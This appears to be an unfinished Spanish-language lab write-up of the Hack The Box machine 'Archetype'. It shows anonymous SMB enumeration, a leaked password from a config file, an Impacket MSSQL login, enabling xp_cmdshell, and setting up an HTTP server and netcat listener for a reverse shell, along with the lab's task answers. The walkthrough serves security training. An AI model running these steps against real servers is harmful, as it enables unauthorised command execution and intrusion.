---
file: Archetype
Pwned: none
tipo: Windows, SMB
dificultad: Starting Point
tag: Maquinas-HTB, Pendiente
---

# Informe

## Inicio:
Utilizamos Nmap para ver que puertos nos salen y uno importante a resaltar es
```bash
PORT     STATE SERVICE
1433/tcp open  ms-sql-s 
```

> **TASK 1**
> Which TCP port is hosting a database server?:
> asw: **1433**

## SMB client:
usamos
```bash
smbclient -N -L \\\\{TARGET_IP}\\
# -N : No password
# -L : This option allows you to look at what services are available on a server
```
![[Pasted image 20230417005727.png]]

luego vamos a backups porque los demas usuarios no te deja acceder y descargamos el unico archivo existente con 
```batch
$ get prod.dtsConfig
```

> **TASK 2**
> What is the name of the non-Administrative share available over SMB?
> asw: **Backups**


y contiene lo siguiente

![[Pasted image 20230417010033.png]]

> **TASK 3**
> What is the password identified in the file on the SMB share?
> asw: **M3g4c0rp123**

La herramienta **impacket** incluye un valioso script de python llamado mssqlclient.py.

**Impacket** es una colección de clases de Python para trabajar con protocolos de red. Impacket se enfoca en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí.

> TASK 4
> What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
> asw: **mssqlclient.py**

La instalamos del repositorio de [Git](https://github.com/fortra/impacket)

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install
# OR: sudo python3 setup.py install
# In case you are missing some modules: pip3 install -r requirements.tx
```

```bash
cd impacket/examples/
#ejecutamos
python3 mssqlclient.py -h
```

Viendo las opciones utlizamos -windows-auth para loguearnos con la contraseña que nos encontramos antes
```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```
%%
[Book pentesting mssql microsoft sql server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
[Book mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
%%

Para poder corroborar que rol tenemos en el sistema utilizamos
```sql
SELECT is_srvrolemember('sysadmin');
```
![[Pasted image 20230418105930.png]]
%% Si nos aparece 1 significa [True]() a la pregunta si somos administradores.%%

> TASK 5
> What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
> asw: **xp_cmdshell**

En esos cheat sheets nos aparece algo para hacer setup del xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
```

Probamos con
```sql
EXEC xp_cmdshell 'net user';
```
pero por default está desactivado
![[Pasted image 20230418111334.png]]

asi que nos fijamos el segundo comando para configurar la xp_cmdshell

o poniendo funciona igual que todas las lineas anteriores
```sql
enable_xp_cmdshell
```

al final de los 4 comandos introducimos xp_cdmshell "whoami" para intentar ver si funciona la shell

ahora intentaremos subir un archivo nc64 para poder hacer una shell inversa con cmd.exe

iremos hasta la carpeta donde tiene el binario a subir y luego abrimos un servidor puerto http -p 80 y un netcat de escucha

```bash
sudo python3 -m http.server 80
sudo nc -lvnp 443
```

Para cargar el binario en el sistema de destino, necesitamos encontrar la carpeta adecuada para eso. Usaremos PowerShell para las siguientes tareas, ya que nos brinda muchas más funciones que el símbolo del sistema normal

> TASK 6
> What script can be used in order to search possible paths to escalate privileges on Windows hosts?
> asw: **winPEAS**

Esta ultima parte no se por qué en ninguna ocasión me dejó hacer una conexion http conmigo pareciera que no estaba conectado pero cuando me hacia ping si me respondia, no pude cargar el archivo en la maquina.

**Ya volveré con esta maquina.**
*I'll be back*




